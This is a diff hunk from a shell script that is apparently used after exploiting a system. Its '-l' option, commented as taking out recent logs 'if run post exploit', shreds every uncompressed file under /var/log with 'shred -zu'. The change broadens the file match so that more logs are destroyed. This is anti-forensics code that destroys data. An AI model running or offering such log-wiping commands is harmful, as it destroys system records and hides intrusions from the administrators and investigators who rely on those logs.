@@ -23,7 +23,7 @@ while getopts ":hsHl" arg;
                 ;;
                 # Take out the recent log files if run post exploit otherwise leave
                 l )
-                  for log in `/usr/bin/find /var/log -name *log$*`; do 
+                  for log in `/usr/bin/find -H /var/log -type f | grep -v gz`; do 
 			  shred -zu $log
 			  done
                   echo "$green Recent logs wiped $reset"
